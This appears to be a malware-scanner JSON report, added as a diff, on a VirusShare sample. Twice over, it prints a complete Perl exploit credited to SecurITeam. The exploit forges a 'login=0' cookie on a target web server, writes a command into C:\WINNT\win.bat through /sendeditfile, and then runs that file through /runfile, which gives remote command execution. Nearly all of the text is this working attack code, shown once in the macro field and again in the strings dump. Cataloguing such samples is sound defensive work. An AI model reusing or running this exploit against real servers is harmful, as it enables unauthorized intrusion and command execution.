@@ -1,0 +1,76 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {},
+        "macro": "#!/usr/bin/perl\n#\n# Exploit by SecurITeam\nuse IO::Socket;\nunless (@ARGV == 1) { die \"usage: $0 host ...\" }\n$host = shift(@ARGV);\n$remote = IO::Socket::INET->new( Proto => \"tcp\",\nPeerAddr => $host,\nPeerPort => \"http(80)\",\n);\nunless ($remote) { die \"cannot connect to http daemon on $host\" }\n\n$remote->autoflush(1);\n\n$request = \"POST /sendeditfile HTTP/1.1\\r\\\nAccept: */*\\r\\\nReferer: http://$;host/editfile=?C:\\\\WINNT\\\\win.bat?\\r\\\nContent-Type: application/x-www-form-urlencoded\\r\\\nHost: $host\\r\\\nConnection: close\\r\\\nContent-Length: 25\\r\\\nCookie: login=0\\r\\\n\\r\\\nnewfiledata=cmd+%2Fc+calc\";\n\nprint $remote $request;\n\nsleep(1);\n\n$MAXLEN = 256;\n\nif ($remote->recv($newmsg, $MAXLEN))\n{\nprint \"Result: $newmsg\\n\";\n} \n\nsleep(1);\n\nclose $remote;\n\n#---- \n\n$remote = IO::Socket::INET->new( Proto => \"tcp\",\nPeerAddr => $host,\nPeerPort => \"http(80)\",\n);\nunless ($remote) { die \"cannot connect to http daemon on $host\" }\n\n$remote->autoflush(1);\n\n$request = \"GET /runfile=?C:\\\\WINNT\\\\win.bat? HTTP/1.1\\r\\\nAccept: */*\\r\\\nHost: AnyHostWillDo\\r\\\nCookie: login=0\\r\\\n\\r\\n\";\n\nprint $remote $request;\n\nsleep(1);\n\n$MAXLEN = 256;\n\nif ($remote->recv($newmsg, $MAXLEN))\n{\nprint \"Result: $newmsg\\n\";\n} \n\nsleep(1);"
+    },
+    "filename": "VirusShare_15a74bbd64e67025a84241655a52d5b2",
+    "filesize": 1254,
+    "filetype": "Perl script text executable",
+    "hashes": {
+        "md5": "15a74bbd64e67025a84241655a52d5b2",
+        "sha1": "d1880d3beb4fe3d2a2a26a3d5cd7ed01e9b4da94",
+        "sha256": "ddaee217fd9970a7cbe589cc1d3738eb2ef123ac02a29ba288281c1f31632f6a"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "#!/usr/bin/perl",
+            "# Exploit by SecurITeam",
+            "use IO::Socket;",
+            "unless (@ARGV == 1) { die \"usage: $0 host ...\" }",
+            "$host = shift(@ARGV);",
+            "$remote = IO::Socket::INET->new( Proto => \"tcp\",",
+            "PeerAddr => $host,",
+            "PeerPort => \"http(80)\",",
+            "unless ($remote) { die \"cannot connect to http daemon on $host\" }",
+            "$remote->autoflush(1);",
+            "$request = \"POST /sendeditfile HTTP/1.1\\r\\",
+            "Accept: */*\\r\\",
+            "Referer: http://$;host/editfile=?C:\\\\WINNT\\\\win.bat?\\r\\",
+            "Content-Type: application/x-www-form-urlencoded\\r\\",
+            "Host: $host\\r\\",
+            "Connection: close\\r\\",
+            "Content-Length: 25\\r\\",
+            "Cookie: login=0\\r\\",
+            "newfiledata=cmd+%2Fc+calc\";",
+            "print $remote $request;",
+            "sleep(1);",
+            "$MAXLEN = 256;",
+            "if ($remote->recv($newmsg, $MAXLEN))",
+            "print \"Result: $newmsg\\n\";",
+            "sleep(1);",
+            "close $remote;",
+            "#---- ",
+            "$remote = IO::Socket::INET->new( Proto => \"tcp\",",
+            "PeerAddr => $host,",
+            "PeerPort => \"http(80)\",",
+            "unless ($remote) { die \"cannot connect to http daemon on $host\" }",
+            "$remote->autoflush(1);",
+            "$request = \"GET /runfile=?C:\\\\WINNT\\\\win.bat? HTTP/1.1\\r\\",
+            "Accept: */*\\r\\",
+            "Host: AnyHostWillDo\\r\\",
+            "Cookie: login=0\\r\\",
+            "\\r\\n\";",
+            "print $remote $request;",
+            "sleep(1);",
+            "$MAXLEN = 256;",
+            "if ($remote->recv($newmsg, $MAXLEN))",
+            "print \"Result: $newmsg\\n\";",
+            "sleep(1);"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": [
+            "http://host/editfile=?C:\\\\WINNT\\\\win.bat?\\r\\"
+        ]
+    },
+    "time": "0:00:00.267942",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
